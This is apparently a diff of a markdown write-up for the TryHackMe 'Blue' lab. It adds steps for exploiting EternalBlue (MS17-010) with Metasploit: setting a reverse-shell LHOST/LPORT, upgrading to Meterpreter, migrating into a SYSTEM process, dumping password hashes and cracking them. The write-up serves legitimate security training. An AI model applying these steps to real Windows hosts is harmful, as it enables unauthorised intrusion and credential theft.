@@ -1,4 +1,4 @@
-# 🟦 Machine 01 — Blue (TryHackMe)
+# 🟦 Machine 01 — Blue
 
 ## 📌 Overview
 Blue is a Windows machine vulnerable to EternalBlue (MS17-010).  
@@ -25,14 +25,8 @@ nmap -sCV -n -Pn -p- -oN scan.nmap <TARGET_IP>
 
 These are the primary tools and utilities used during the assessment of this machine:
 
-- **Nmap** — Network scanning and service enumeration  
-- **SMBclient** — SMB enumeration and information gathering  
+- **Nmap** — Network scanning and service enumeration    
 - **Metasploit Framework** — Exploitation and payload handling  
-- **Impacket Suite** — SMB/MSRPC interaction and validation  
-- **Netcat / Socat** — Shell handling and reverse connections  
-- **PowerShell / CMD** — Windows post‑exploitation commands  
-- **LinPEAS / WinPEAS** — Privilege escalation enumeration (when applicable)  
-- **Custom scripts** — Auxiliary enumeration or exploitation helpers  
 
 ---
 
@@ -41,21 +35,50 @@ These are the primary tools and utilities used during the assessment of this mac
 ### 🔸 EternalBlue (MS17-010)
 - Vulnerability confirmed
   ![Confirmed](../Images/01-Blue/vulnConfirmed.png)
-- Use a modern exploit module or manual approach  
-- flag2.txt is in the sam location    
+- Use of Metasploit for payloads
+  ![ms17-010](../Images/01-Blue/ms17_010.png)
+
+- Setting payload to use
+![setPayload](../Images/01-Blue/setPayload.png)
+
+- Setting options:
+  - set RHOST $IP
+  - set LHOST $ATTACKER-IP
+  - set LPORT $ATTACKER-PORT
+  - run
+![setting](../Images/01-Blue/shellMetasploit.png)
+    
 
 ---
 
 ## 🚀 4. Privilege Escalation
 Since EternalBlue grants SYSTEM, no additional escalation is required.  
-Document post-exploitation steps and verification commands.
+![rootConfirmed](../Images/01-Blue/rootConfirmed.png)
+
+Now we need to upgrade our shell to a Meterpreter shell, because the next step is to hashdump to extract the hash of the non-default user. To do this, we use the "background" command or just Ctrl+Z, then load the module post(multi/manage/shell/to/meterpreter), change the SESSION option and select SESSION 2 'meterpreter x86/windows'.
+
+List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM. 
+
+Migrate to this process
+
+```migrate $ID```
+
+- Use of hashdump
+![hashdump](../Images/01-Blue/hashdump.png)
+
+To obtain Jon’s password, I used CrackStation, but it’s also possible to do it with JohnTheRipper or Hashcat.
 
 ---
 
 ## 📂 5. Loot & Flags
-- User flag  
-- Root/System flag  
-- Any additional artifacts  
+- Logged in as Administrator, the flag1.txt file is located in the C:\ directory
+![flag1.txt](../Images/01-Blue/flag1.txt.png)
+ 
+- Logged in as Administrator, the flag2.txt file is located in the same directory as the SAM database C:\windows\System32\config
+![flag2.txt](../Images/01-Blue/flag2.txt.png)
+  
+- Logged in as Jon, the flag3.txt file is located in C:\Users\Jon\Documents
+![flag2.txt](../Images/01-Blue/flag3.txt.png)   
 
 ---
 
@@ -72,10 +95,4 @@ Document post-exploitation steps and verification commands.
 - EternalBlue exploitation workflow  
 - SMB enumeration methodology  
 - Windows post-exploitation basics  
-
----
-
-## 📚 References
-- TryHackMe: Blue  
-- Microsoft MS17-010 advisory  
-- EternalBlue exploit documentation  
+ 
